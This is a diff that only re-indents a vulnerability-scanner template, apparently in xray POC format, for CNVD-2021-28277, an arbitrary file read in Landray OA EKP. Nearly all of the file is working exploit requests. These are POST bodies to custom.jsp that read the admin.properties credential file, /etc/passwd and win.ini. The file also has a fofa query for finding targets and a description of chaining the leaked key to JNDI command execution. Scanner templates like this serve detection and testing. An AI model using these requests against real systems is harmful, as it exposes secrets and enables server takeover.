@@ -1,36 +1,35 @@
 id: CNVD-2021-28277
 
 info:
-    name: Landray OA Custom JSP file rread
-    author: B1anda0(https://github.com/B1anda0)
-    severity: critical
-    verified: true
-    description: |
-        深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息，读取配置文件得到密钥后访问 admin.do 即可利用 JNDI远程命令执行获取权限
-        fofa: app="Landray-OA系统"
-    reference:
-        - https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
-    tags: landray,lfi,cnvd,cnvd2021
-    created: 2023/06/16
+  name: Landray OA Custom JSP file rread
+  author: B1anda0
+  severity: critical
+  verified: true
+  description: |
+    深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息，读取配置文件得到密钥后访问 admin.do 即可利用 JNDI远程命令执行获取权限
+    fofa: app="Landray-OA系统"
+  reference:
+    - https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
+  tags: landray,lfi,cnvd,cnvd2021
+  created: 2023/06/16
 
 rules:
-    r0:
-        request:
-            method: POST
-            path: /sys/ui/extend/varkind/custom.jsp
-            body: var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
-        expression: response.status == 200 && response.body.bcontains(b'password') && response.body.bcontains(b'kmss.properties.encrypt.enabled')
-    linux0:
-        request:
-            method: POST
-            path: /sys/ui/extend/varkind/custom.jsp
-            body: var={"body":{"file":"file:///etc/passwd"}}
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-    windows0:
-        request:
-            method: POST
-            path: /sys/ui/extend/varkind/custom.jsp
-            body: var={"body":{"file":"file:///c://windows/win.ini"}}
-        expression: response.status == 200 && response.body.bcontains(b"bit app support") && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
+  r0:
+    request:
+      method: POST
+      path: /sys/ui/extend/varkind/custom.jsp
+      body: var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
+    expression: response.status == 200 && response.body.bcontains(b'password') && response.body.bcontains(b'kmss.properties.encrypt.enabled')
+  linux0:
+    request:
+      method: POST
+      path: /sys/ui/extend/varkind/custom.jsp
+      body: var={"body":{"file":"file:///etc/passwd"}}
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  windows0:
+    request:
+      method: POST
+      path: /sys/ui/extend/varkind/custom.jsp
+      body: var={"body":{"file":"file:///c://windows/win.ini"}}
+    expression: response.status == 200 && response.body.bcontains(b"bit app support") && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
 expression: r0() || windows0() || linux0()
-
